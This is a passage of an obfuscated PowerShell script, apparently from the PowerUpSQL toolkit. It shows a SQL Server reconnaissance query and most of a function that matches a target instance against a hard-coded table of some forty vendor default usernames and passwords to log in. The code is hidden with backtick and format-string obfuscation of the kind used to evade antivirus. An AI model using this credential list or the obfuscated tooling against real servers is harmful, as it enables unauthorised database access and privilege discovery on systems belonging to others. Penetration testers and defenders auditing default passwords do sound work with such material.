            ${s`ySADm`iN`se`TuP} = ((("{41}{69}{90}{77}{81}{105}{104}{29}{15}{14}{19}{80}{38}{91}{23}{30}{6}{9}{43}{59}{83}{68}{1}{13}{45}{18}{35}{34}{110}{60}{31}{2}{96}{17}{10}{22}{44}{95}{5}{76}{28}{3}{8}{65}{100}{106}{84}{58}{74}{56}{102}{89}{94}{93}{103}{62}{67}{70}{16}{64}{82}{57}{72}{12}{107}{37}{27}{7}{4}{85}{49}{33}{40}{24}{92}{99}{97}{50}{71}{98}{75}{39}{53}{20}{79}{52}{46}{66}{54}{47}{0}{73}{88}{108}{101}{86}{42}{25}{11}{36}{63}{87}{21}{109}{61}{55}{48}{26}{51}{32}{78}" -f'rosoft{0}Windows N','y		= ','ey		',',
 ','SYSNAME','Set{0}Con','p_regread','ECLARE @ProductName  ','  ','
     ','YSTEM','value_nam','io','N{1}','   DEC','         ','  ','1}S','LOCAL_M','LARE @MachineT','}HKEY_LOCAL_MACHINE{1},
         ','roductNa','{0}Cur','ter.dbo.','bo.','    @','lue			= @Prod','  D','ProductOptions{1}','ne type
    ','x','@k','me','         EXECUTE','
 ','ACHINE{1},','e		= N','       ','pe  SYSNAME
            ','y	',' master.d','
   ','      ','    ','rentC','HKEY_','ey			= ','}Mic','@va','     ','d
   ','uctNa',' @k','	= N{1','{0','   ','ctType{1},
  ',' O','N{','       ','        ','            ','      ','{1','   ','            ','N{1}SOFTWARE','   ','tke','          ',' ','       ','S vers','T{0}CurrentVersio','1}Produ','tke','trol{0}','-',' output','      ','y',' G','-- Get','@roo','ame		= ','
  ',' ','}P','n{1},
 ','        ','   -','    EXECUTE mas','x','outpu','   @value			= @MachineType ','ontrol','	= N{','ea','      @roo','p_regr',' @','  ','   ','t
 ','hi','et mac','value_n','n
       ','  ','me{1},
 ','       '))  -f [cHAr]92,[cHAr]39)
                ${S`Y`SADmIn`QuERY}  = ("{16}{13}{1}{7}{17}{2}{3}{8}{5}{4}{10}{15}{14}{9}{6}{12}{11}{0}" -f'e],','hi','chine','T','   ','
 ','tName as [OSVersion','neType as ','ype],','c','    ','am','N','Mac','      @Produ','  ','  @','[OsMa')
        } else {
            ${Sys`AD`mi`NseTup} = ''
            ${sY`s`AdMiNqUERy} = ''
        }

        ${Q`UerY} = (' '+' '+'--'+' '+'Get'+' '+'SQL'+' '+'Serve'+'r'+' '+'Info'+'rma'+'tion
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'Get'+' '+'S'+'QL '+'Ser'+'v'+'er '+'S'+'erv'+'ice '+'Nam'+'e '+'an'+'d '+'Path
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'D'+'ECLARE'+' '+'@SQLSer'+'v'+'er'+'I'+'nstanc'+'e '+'var'+'ch'+'ar'+'(250'+')
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DECLAR'+'E '+'@SQL'+'Server'+'S'+'erviceNa'+'m'+'e '+'v'+'a'+'rchar'+'(250)
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'i'+'f '+'@@SERVI'+'CENAM'+'E '+'= '+(('Y'+'QTM'+'SSQL'+'SERVE'+'RYQ'+'T
 ') -cReplace  ([CHAR]89+[CHAR]81+[CHAR]84),[CHAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'BEG'+'IN
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'set'+' '+'@SQ'+'LServerIns'+'ta'+'nce'+' '+'= '+('{0'+'}SYSTEM{1}Curren'+'tC'+'ontrolSet{'+'1}Servi'+'ce'+'s{1}M'+'SSQ'+'LS'+'ERVER{0}
 ') -f[Char]39,[Char]92+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'se'+'t '+'@'+'SQLSe'+'rverS'+'erviceN'+'ame'+' '+'= '+('{0}'+'MS'+'S'+'QLSERVER{0}
 ') -f  [chAR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EN'+'D
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'LSE
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'B'+'EG'+'IN
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'set'+' '+'@'+'SQ'+'LS'+'erverIn'+'s'+'tance '+'= '+"'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME "+'as'+' '+'v'+'archar(2'+'5'+'0))
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'set'+' '+'@SQL'+'S'+'erve'+'rS'+'e'+'rviceName '+'= '+"'MSSQL$'+cast(@@SERVICENAME "+'a'+'s '+'varch'+'ar(250)'+')'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EN'+'D
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'-'+'- '+'Ge'+'t '+'SQ'+'L '+'Se'+'rv'+'er '+'Ser'+'vi'+'ce '+'Ac'+'count'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DEC'+'LAR'+'E '+'@'+'Servi'+'ce'+'accountName '+'varchar'+'(250'+')'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'X'+'ECUTE '+'master.db'+'o.xp_instanc'+'e_r'+'egr'+'ead'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('NEqNHKEY_L'+'OCAL_'+'MACHI'+'NEE'+'qN,'+' ')  -cReplaCe'EqN',[cHar]39)+'@SQLServer'+'Ins'+'t'+'anc'+'e,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('NbdAObject'+'NamebdA,@'+'S'+'e'+'r'+'v'+'i'+'c'+'e'+'Ac'+'countN'+'ame ') -crePLaCe  'bdA',[ChaR]39)+'OU'+'T'+'PUT, '+(('Nkw7no'+'_out'+'putk'+'w7
 ')  -repLACe([CHaR]107+[CHaR]119+[CHaR]55),[CHaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'Get'+' '+'au'+'the'+'nt'+'ication '+'mo'+'de
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'D'+'ECLARE '+'@Auth'+'enti'+'c'+'ationMode '+'INT
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EXEC'+' '+'maste'+'r.db'+'o'+'.x'+'p_in'+'s'+'tance_'+'re'+'grea'+'d '+(('NB70HKEY'+'_'+'LOCA'+'L_'+'MACHINEB7'+'0,'+'
 ') -replace  'B70',[chAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('N'+'0Mk'+'Sof'+'tware'+'IokMi'+'crosoftIo'+'k'+'MSSQ'+'LServe'+'rIokMSSQL'+'Server0M'+'k,
'+' ') -CREPlAcE([CHAR]48+[CHAR]77+[CHAR]107),[CHAR]39  -rEPlACE ([CHAR]73+[CHAR]111+[CHAR]107),[CHAR]92)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('N{'+'0}Lo'+'gi'+'nMode'+'{0'+'}'+', ') -F [cHAR]39+'@A'+'uth'+'e'+'n'+'ti'+'cationMo'+'de '+'OUTP'+'UT
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'Grab'+' '+'a'+'ddi'+'tional '+'infor'+'mat'+'ion'+' '+'as'+' '+'sysad'+'mi'+'n
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$SysadminSetup
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'-'+'- '+'Retur'+'n '+'s'+'e'+'rver '+'and'+' '+'ver'+'si'+'on '+'infor'+'matio'+'n
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SELEC'+'T '+' '+"'$ComputerName' "+'as'+' '+'[Co'+'mput'+'erName'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@'+'@se'+'rvername '+'as'+' '+'[I'+'nstance],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DEFAULT_'+'D'+'OMAIN('+') '+'as'+' '+'[D'+'om'+'ainN'+'am'+'e],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@SQLSe'+'rver'+'Se'+'r'+'vice'+'Name '+'as'+' '+'['+'Servic'+'eNam'+'e'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@S'+'e'+'rvice'+'Acc'+'ount'+'Name '+'a'+'s '+'[Serv'+'i'+'ceAccou'+'nt],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'(S'+'E'+'LECT '+'CA'+'SE '+'@Authe'+'nticationMod'+'e
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WHE'+'N '+'1 '+'THEN'+' '+(('NYBW'+'indo'+'ws'+' ') -CRePlace 'NYB',[CHAR]39)+('A'+'u'+'th'+'en'+'tica'+'tion{0}
 ') -F  [cHar]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WHE'+'N '+'2 '+'T'+'HEN '+('{0'+'}W'+'i'+'ndows ') -F[ChAR]39+'an'+'d '+'SQL'+' '+'Se'+'r'+'ver '+(('Authen'+'tic'+'ation'+'V2C'+'
'+' ')-repLaCe  ([chAR]86+[chAR]50+[chAR]67),[chAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ELS'+'E '+(('EmSUnknow'+'nEm'+'S'+'
 ')  -cREplace'EmS',[char]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EN'+'D) '+'a'+'s '+'['+'Aut'+'henticationMo'+'de]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'CAS'+'E '+' '+('SE'+'R'+'VE'+'RPROPERT'+'Y(G'+'ZhIsClust'+'eredGZh)
 ')."REPl`ACE"(([chAr]71+[chAr]90+[chAr]104),[STrINg][chAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WHE'+'N '+'0'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'THE'+'N '+('G'+'V'+'UNoGVU
 ')."r`EPLaCe"('GVU',[StRiNG][Char]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ELSE'+' '+('{0}Y'+'e'+'s{'+'0}
 ')-F [cHAr]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EN'+'D '+'as'+' '+'[Clust'+'ere'+'d],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('SERV'+'ERPR'+'O'+'PERTY('+'Vbxpr'+'o'+'ductve'+'rs'+'ion'+'Vbx) ')."rep`LaCE"('Vbx',[STrING][CHar]39)+'as'+' '+'['+'SQ'+'L'+'Server'+'Versi'+'o'+'nNumb'+'er'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SU'+'BSTRI'+'NG(@@V'+'ERSION'+', '+('CH'+'ARIND'+'EX('+'wIT2w'+'IT, ')."RePLa`CE"(([chAR]119+[chAR]73+[chAR]84),[stRINg][chAR]39)+'@@VERS'+'I'+'ON), '+'4'+') '+'as'+' '+'[SQLSer'+'v'+'e'+'rMajo'+'rVe'+'rsi'+'o'+'n],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('s'+'e'+'rv'+'erpr'+'oper'+'ty('+'0'+'GsEdit'+'ion0Gs)'+' ')."rEP`l`Ace"(([cHar]48+[cHar]71+[cHar]115),[StrINg][cHar]39)+'a'+'s '+'[SQLServerEd'+'i'+'t'+'ion'+'],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('SERVERPROPER'+'TY('+'{'+'0'+'}'+'Produc'+'tL'+'e'+'vel{0}) ')  -F  [cHar]39+'A'+'S '+'[SQLS'+'erver'+'ServicePack'+'],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SUB'+'ST'+'RING'+'(@@VER'+'SI'+'ON'+', '+('CHARINDE'+'X('+'{0}'+'x{0}, ')-f[Char]39+'@@VER'+'S'+'ION'+'), '+'3'+') '+'a'+'s '+'[O'+'S'+'A'+'rc'+'hitecture'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$SysadminQuery
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'RI'+'GHT'+'('+'S'+'UB'+'STR'+'ING('+'@@VERSION, '+('CHA'+'RI'+'NDEX('+'{0}Windo'+'ws ')-F  [ChAR]39+(('NTDwA'+', ')  -CrepLaCe([chAr]68+[chAr]119+[chAr]65),[chAr]39)+'@@'+'VERS'+'ION),'+' '+'1'+'4), '+'3'+') '+'a'+'s '+'[Os'+'V'+'er'+'sion'+'Nu'+'mber],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'S'+'Y'+'ST'+'EM_USER '+'as'+' '+'[C'+'ur'+'re'+'ntlogin],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$IsSysadmin' "+'as'+' '+'[IsS'+'y'+'s'+'admin],
 '+' '+' '+' '+' '+' '+' '+' '+"'$ActiveSessions' "+'as'+' '+'[A'+'cti'+'v'+'eSessions]')
        ${tBlse`RvERI`N`FOt`eMP} = &("{1}{3}{2}{0}"-f'y','Get-S','er','QLQu') -Instance ${INST`An`Ce} -Query ${Q`UEry} -Username ${U`SE`R`NAme} -Password ${PAs`s`W`OrD} 
        ${TblSE`RV`erI`Nfo} = ${t`BLSE`RVeRI`NFo} + ${t`BlSE`RVE`RiN`F`oteMP}
    } End {
        ${T`BlsE`RV`erINFo}
    }
}
Function  geT-sQLsE`RV`E`Rlo`G`IN`d`efa`ULtPw {
    [CmdletBinding()]
    Param(
        [Parameter(MAndATORy = ${FAl`SE},
                VaLuEFROMpiPeLinebYprOperTYnAmE = ${tR`Ue},
        helpmeSSAGe = {"{4}{6}{10}{0}{2}{1}{3}{8}{7}{9}{5}" -f'r','nstance ',' i','t','S','o.','QL Ser',' conn','o','ection t','ve'})]
        [string]${i`N`StaNcE},
        [Parameter(mAnDatorY = ${fAL`SE},
        heLpMessaGe = {"{12}{10}{14}{4}{5}{0}{8}{1}{2}{13}{9}{11}{3}{6}{7}"-f'.',' Us','ed whe','a','ro','rs','ppe','d.',' ','n ','ose','is wr','Suppress verb','n functio',' er'})]
        [switch]${Su`P`PreSs`V`erbose}
    )

    Begin {
        
        ${tbLr`ES`ULTs} = &("{3}{0}{2}{1}"-f 'w-O','t','bjec','Ne') -TypeName ("{4}{1}{3}{2}{5}{0}" -f'ble','ystem.D','D','ata.','S','ataTa')
        ${T`Blr`EsultS}."Col`UM`Ns".("{0}{1}" -f 'A','dd').Invoke(("{2}{1}{0}" -f'ter','ompu','C')) | &("{0}{1}" -f'Out-Nu','ll')
        ${TblREsU`L`TS}."col`Umns".("{0}{1}"-f 'A','dd').Invoke(("{1}{2}{0}"-f 'nce','In','sta')) | &("{1}{2}{0}"-f 'ull','Ou','t-N')
        ${TBLRE`S`U`lts}."c`Ol`UmnS".("{0}{1}"-f 'A','dd').Invoke(("{1}{2}{0}" -f 'rname','Us','e')) | &("{0}{1}" -f'Ou','t-Null')
        ${Tb`Lr`eSULTS}."Co`lU`MnS".("{1}{0}" -f 'dd','A').Invoke(("{1}{0}{2}"-f'assw','P','ord')) | &("{1}{0}{2}" -f'-Nu','Out','ll') 
        ${TBLrEsU`L`TS}."COLu`MNs".("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}{2}" -f'IsS','ysA','dmin')) | &("{0}{1}{2}"-f'Out-','N','ull')

        
        ${Defa`U`lt`PaSsw`ORDS} = &("{2}{1}{0}"-f'ct','e','New-Obj') ("{4}{2}{0}{1}{3}"-f 'm.Data','.','ste','DataTable','Sy')
        ${dEF`AUltPAsSw`Or`Ds}."c`oLUMns".("{1}{0}" -f'd','Ad').Invoke(("{2}{1}{0}"-f 'e','c','Instan')) | &("{2}{0}{1}" -f't-N','ull','Ou')
        ${De`F`AuL`TPASSwo`RdS}."co`LUmNs".("{1}{0}"-f'dd','A').Invoke(("{1}{0}"-f'rname','Use')) | &("{1}{0}" -f 't-Null','Ou')
        ${DeF`A`ULTpAs`SWor`ds}."C`oLuMns".("{0}{1}" -f 'A','dd').Invoke(("{0}{1}" -f'Passwor','d')) | &("{1}{2}{0}" -f 'l','Out-Nu','l')        

        
        ${dEfA`U`lt`paSSW`oRdS}."Ro`Ws".("{1}{0}" -f 'dd','A').Invoke("ACS","ej","ej") | &("{0}{1}" -f 'Ou','t-Null')
        ${defau`lTPaS`sWo`RdS}."rO`ws".("{0}{1}" -f 'Ad','d').Invoke(("{1}{0}" -f'T7','AC'),"sa",("{0}{1}"-f's','age')) | &("{0}{2}{1}" -f'O','Null','ut-')
        ${DEf`AUl`Tp`AsS`WoRDS}."Ro`Ws".("{0}{1}"-f'Ad','d').Invoke(("{1}{0}"-f '2','AOM'),("{0}{1}"-f'adm','in'),("{0}{2}{1}"-f'ca_a','min','d')) | &("{0}{2}{1}"-f'o','t-null','u')
        ${D`eFauLTP`AS`swo`R`ds}."ro`wS".("{1}{0}" -f'd','Ad').Invoke(("{0}{1}" -f 'A','RIS'),("{0}{1}" -f 'ARI','S9'),("{3}{2}{0}{1}"-f 'm9','n#','ARIS!1d','*')) | &("{0}{1}{2}"-f 'out-n','ul','l')
        ${DEFA`UlTPa`s`SWORds}."R`oWs".("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{3}{1}" -f 'Au','lt','todesk','Vau'),"sa",("{4}{0}{1}{2}{3}"-f'odeskVa','u','l','t@26200','Aut')) | &("{1}{0}"-f'ut-Null','O')      
        ${deFaUl`TPAsSw`o`Rds}."R`oWs".("{1}{0}" -f'dd','A').Invoke(("{1}{2}{0}"-f 'L','BOS','CHSQ'),"sa",("{2}{0}{1}" -f '12','345','RPSsql')) | &("{2}{1}{0}" -f'll','t-Nu','Ou')
        ${DEfa`UL`T`PasS`words}."r`ows".("{1}{0}"-f 'dd','A').Invoke(("{1}{2}{0}"-f 'ERVER9','BPA','S'),"sa",("{0}{1}{2}"-f'AutoMateBP','A','9')) | &("{2}{0}{1}"-f'-Nul','l','Out')
        ${D`EFA`Ul`T`pAsswOrDS}."RO`wS".("{1}{0}" -f'dd','A').Invoke(("{1}{2}{0}"-f 'OM','CD','RDIC'),"sa",("{2}{1}{0}" -f'om50!','Dic','CDR')) | &("{1}{0}" -f'll','Out-Nu')
        ${DefaULt`paS`sW`o`RDs}."RO`Ws".("{0}{1}" -f 'Ad','d').Invoke(("{1}{2}{0}"-f 'L','CO','DEPA'),"sa",("{1}{0}"-f'3p@l','Cod')) | &("{2}{0}{1}"-f 'N','ull','Out-')
        ${DEfaU`LTpa`ss`WordS}."R`oWs".("{0}{1}"-f'A','dd').Invoke(("{1}{0}{2}" -f 'OD','C','EPAL08'),"sa",("{1}{0}" -f 'l','Cod3p@')) | &("{1}{2}{0}"-f 'Null','Ou','t-')
        ${d`eF`AU`LT`pAsswo`RDs}."R`OWs".("{1}{0}"-f'dd','A').Invoke(("{2}{0}{1}{3}"-f 't','erPoi','Coun','nt'),"sa",("{3}{4}{0}{1}{2}"-f 'oi','n','t8','C','ounterP')) | &("{1}{2}{0}" -f 'ull','Out','-N')
        ${DEf`AultPA`S`sW`o`RdS}."ro`WS".("{1}{0}" -f'd','Ad').Invoke(("{1}{0}" -f '05','CSSQL'),("{0}{1}" -f'ELNAdm','in'),("{1}{0}" -f 'dmin','ELNA')) | &("{0}{1}"-f 'Out-Nul','l')
        ${dE`Fa`UL`TpAsSwOrdS}."r`OWS".("{1}{0}"-f'dd','A').Invoke(("{0}{1}{2}"-f'CSSQ','L','05'),"sa",("{0}{2}{1}" -f'Camb','t_SA','ridgeSof')) | &("{2}{1}{0}" -f 'l','Nul','Out-')
        ${defAulTPa`s`S`W`oRDs}."r`OwS".("{0}{1}" -f 'A','dd').Invoke(("{1}{0}{2}"-f 'S','CAD','QL'),("{1}{4}{3}{2}{0}"-f'r','CA','Use','SQLAdmin','D'),("{1}{3}{0}{2}" -f'g1sth3M','Cr4','4n!','1')) | &("{0}{1}" -f'Out-N','ull')
        ${dEfau`lTPAS`sw`ORds}."ro`WS".("{1}{0}" -f'dd','A').Invoke(("{2}{1}{0}" -f'HIP','EASYS','DHL'),"sa",("{2}{1}{0}"-f 'admin@1','L','DH')) | &("{1}{2}{0}" -f 'll','Out-N','u')
        ${DEF`Au`lTpASsWOR`ds}."rO`ws".("{0}{1}"-f'Ad','d').Invoke("DPM",("{0}{1}"-f 'adm','in'),("{1}{2}{0}"-f 'admin','ca','_')) | &("{1}{0}" -f'll','out-nu')
        ${DefA`UlT`pasS`W`ORds}."r`ows".("{1}{0}"-f'dd','A').Invoke(("{0}{1}" -f 'DVTE','L'),"sa","") | &("{2}{0}{1}"-f'u','ll','Out-N')
        ${dEFAuLTpAS`s`WO`R`ds}."r`OWS".("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}"-f 'EASYSH','IP'),"sa",("{1}{2}{0}" -f'min@1','DH','Lad')) | &("{0}{1}{2}"-f'Out-','Nul','l')
        ${D`e`FAuLtPa`ssW`ORdS}."R`ows".("{1}{0}"-f'd','Ad').Invoke("ECC","sa",("{0}{1}{3}{2}"-f'We','bgi','11','lity20')) | &("{2}{1}{0}"-f'l','ut-Nul','O')
        ${dE`F`A`U`LtpassW`OrdS}."ro`WS".("{0}{1}" -f'Ad','d').Invoke(("{0}{1}{2}" -f'ECO','P','YDB'),("{0}{2}{1}{4}{3}"-f 'e+C0p','20','y','x','07_@'),("{1}{2}{0}{3}" -f 'y2007_@','e','+C0p','x')) | &("{1}{0}"-f'Null','Out-')
        ${dEfau`ltPas`S`WO`RDs}."r`OwS".("{1}{0}"-f'd','Ad').Invoke(("{0}{1}"-f'ECOPYD','B'),"sa",("{1}{0}"-f'opy','ec')) | &("{2}{0}{1}"-f't','-Null','Ou')
        ${D`EFa`UlT`paSSwOrDS}."r`OWS".("{0}{1}" -f 'A','dd').Invoke(("{3}{0}{1}{2}"-f 'e','rson20','12','Em'),"sa",("{2}{0}{1}"-f 'Emer','son42Eme','42')) | &("{2}{1}{0}"-f'l','ul','Out-N')
        ${dE`FaULt`pASSWo`Rds}."ro`WS".("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}"-f'PS','HD'),"sa","sa") | &("{0}{1}" -f 'Out-Nu','ll')
        ${deF`AU`Ltp`A`sswordS}."ro`wS".("{0}{1}" -f 'A','dd').Invoke(("{0}{1}" -f 'HPD','SS'),"sa",("{0}{3}{2}{1}" -f'Hpds','0001','00','db')) | &("{2}{1}{0}"-f'-Null','t','Ou')
        ${DEF`Aul`TPAsS`WO`RdS}."R`OwS".("{1}{0}"-f'dd','A').Invoke(("{1}{0}" -f'S','HPDS'),"sa",("{1}{0}"-f 'ss','hpd')) | &("{2}{0}{1}"-f't-Nu','ll','Ou')
        ${DeFA`U`lt`p`A`sSWordS}."r`oWs".("{0}{1}"-f 'A','dd').Invoke(("{1}{2}{0}"-f'TGT','IN','SER'),"msi",("{1}{2}{0}"-f '5','keyb','oa')) | &("{0}{1}{2}"-f'Ou','t-','Null')
        ${de`F`AU`LtpaSsWo`RDS}."rO`ws".("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}" -f'IN','SERTGT'),"sa","") | &("{0}{2}{1}"-f'O','Null','ut-')
        ${dEFa`U`lTPaS`sWORDS}."RO`ws".("{0}{1}"-f'Ad','d').Invoke(("{2}{1}{0}"-f'RAVET','NT','I'),"sa",("{0}{1}{2}" -f 'Webs','t','er#1')) | &("{0}{2}{1}" -f 'Ou','-Null','t')
        ${Def`AuL`T`Pas`swOr`Ds}."r`owS".("{1}{0}" -f'd','Ad').Invoke(("{1}{0}{2}"-f'MO','MY','VIES'),"sa",("{0}{3}{2}{1}" -f 't9','7','A','AranuH')) | &("{0}{1}{2}"-f 'Out-N','u','ll')
        ${De`F`Au`LtPa`S`swoRds}."ro`Ws".("{1}{0}"-f 'd','Ad').Invoke(("{0}{3}{1}{2}"-f 'PC','IC','A','AMER'),"sa",("{1}{2}{0}" -f'1ca','p','cAmer')) | &("{1}{2}{0}"-f'l','Ou','t-Nul')
        ${DE`F`Aul`TpaSsWo`RDs}."r`OWs".("{1}{0}"-f'dd','A').Invoke(("{0}{1}{2}" -f'PC','AMERI','CA'),"sa",("{2}{1}{0}" -f'ica','mer','PCA')) | &("{2}{1}{0}" -f'l','ul','Out-N')
        ${De`FauLtpAs`Sw`ORds}."R`oWS".("{1}{0}" -f 'dd','A').Invoke(("{0}{1}" -f 'PRIS','M'),"sa",("{3}{1}{2}{5}{4}{0}" -f'r08','ur','ityM','Sec','e','ast')) | &("{1}{2}{0}" -f'll','Out-N','u')
        ${DEfaULT`P`AssWO`R`Ds}."R`ows".("{0}{1}"-f'Ad','d').Invoke(("{2}{1}{0}" -f 'LDATA','SQ','RM'),("{1}{0}"-f'er','Sup'),("{1}{0}" -f 'range','O')) | &("{0}{2}{1}"-f 'ou','ull','t-n')
        ${DefaUlTP`AS`s`Wor`DS}."r`OwS".("{1}{0}" -f'd','Ad').Invoke(("{0}{1}"-f 'RTCLOCA','L'),"sa",("{0}{2}{1}" -f'my','ssword','pa')) | &("{2}{1}{0}" -f'l','-Nul','Out')
        ${DeF`AUltPa`Ssw`oR`Ds}."r`Ows".("{0}{1}" -f'A','dd').Invoke(("{0}{1}{2}" -f'SA','LESLOG','IX'),"sa",("{2}{0}{1}"-f 'LXMas','ter','S')) | &("{1}{2}{0}"-f'Null','Out','-')
        ${de`F`AuL`TPAssWoRds}."R`OWS".("{1}{0}" -f 'dd','A').Invoke(("{1}{2}{0}{3}" -f 'XI','SI','DE','S_SQL'),"sa",("{1}{0}{3}{2}"-f'g','2BeChan','d','e')) | &("{2}{1}{0}" -f 'ull','-N','Out')
        ${DEfAU`L`T`PaSs`WoRDS}."ro`Ws".("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}" -f 'S','QL2K5'),("{0}{1}" -f'ovs','d'),("{0}{1}"-f'ovs','d')) | &("{1}{0}" -f'l','Out-Nul')
        ${D`eFAUltpassW`or`Ds}."Ro`WS".("{1}{0}" -f 'd','Ad').Invoke(("{2}{0}{1}"-f'PRES','S','SQLEX'),("{0}{1}" -f 'a','dmin'),("{2}{1}{0}" -f 'n','a_admi','c')) | &("{0}{1}{2}"-f'o','u','t-null')
        ${DefaULtpAs`sW`o`RDs}."rO`Ws".("{0}{1}" -f 'Ad','d').Invoke(("{0}{1}{2}{3}"-f'STAN','DA','RDD','EV2014'),("{1}{0}" -f 't','tes'),("{0}{1}"-f'tes','t')) | &("{0}{2}{1}"-f'Out','l','-Nul') 
        ${dEfAu`lT`p`A`sSworDS}."ro`WS".("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{1}{4}{3}" -f 'T','SQ','EW_','SS','LEXPRE'),"tew","tew") | &("{1}{2}{0}"-f 'l','O','ut-Nul')
        ${dE`FAUL`TpASs`Wo`RdS}."RO`wS".("{1}{0}"-f 'd','Ad').Invoke(("{1}{2}{0}" -f 'ct','vocoll','e'),("{0}{1}" -f 'vo','collect'),("{0}{1}{2}"-f'vo','coll','ect')) | &("{0}{1}{2}" -f 'O','ut','-Null')
        ${DE`F`AUlTpaSSwOr`dS}."ro`Ws".("{1}{0}" -f'd','Ad').Invoke(("{0}{2}{1}" -f'VSD','NET','OT'),"sa","") | &("{2}{1}{0}" -f'l','t-Nul','Ou')
        ${dEfAULtp`A`SswoR`dS}."R`ows".("{1}{0}"-f'd','Ad').Invoke(("{0}{1}" -f 'V','SQL'),"sa","111") | &("{1}{0}{2}"-f'ul','Out-N','l')

        ${pwc`oU`NT} = ${d`eFauLTpAss`Wo`R`Ds} | &("{2}{0}{1}"-f'ur','e','meas') | &("{2}{1}{0}" -f 'lect','e','s') ("{1}{0}" -f 't','coun') -ExpandProperty ("{0}{1}"-f 'co','unt')
    } Process {
        ${cOM`PU`TER`NA`ME} = &("{1}{2}{5}{4}{6}{0}{3}"-f 'romIn','G','et-','stance','om','C','puterNameF') -Instance ${I`NSt`ANCE}
        if (-not ${IN`s`T`ANCE}) {
            ${in`s`TANCE} = ${EnV:CO`m`P`UT`ername}
        }
       
        
        ${T`Ar`GETINst`ANce} = ${InsT`A`N`CE}.("{1}{0}" -f't','Spli').Invoke("\")[1]

        
        if (-not ${tA`R`Ge`TINstAn`Ce}) {
            ("$Instance "+': '+'No'+' '+'ins'+'tance '+'matc'+'h '+'fo'+'un'+'d.')
            return
        }
        ${t`BlRE`sulT`stemP} = ${deFauLT`p`ASSw`O`RdS} | &("{0}{2}{1}" -f 'W','ere-Object','h') { ${_}."Insta`N`cE" -eq "$TargetInstance"}        

        if (${TblReSU`lt`S`TEMp}) {
            ("$Instance "+': '+'C'+'onfi'+'rme'+'d '+'in'+'stan'+'ce'+' '+'m'+'atch.')            
        } else {
            ("$Instance "+': '+'No'+' '+'in'+'stan'+'c'+'e '+'m'+'atch '+'fou'+'nd.')
            return  
        }
        ${CuR`ReNTus`E`RNAMe} = ${Tbl`ReSul`TSTEmP}."uSER`Name"
        ${C`UR`R`e`NtpaSSWorD} = ${T`BlrEs`Ults`TE`mP}."P`ASSWoRD"
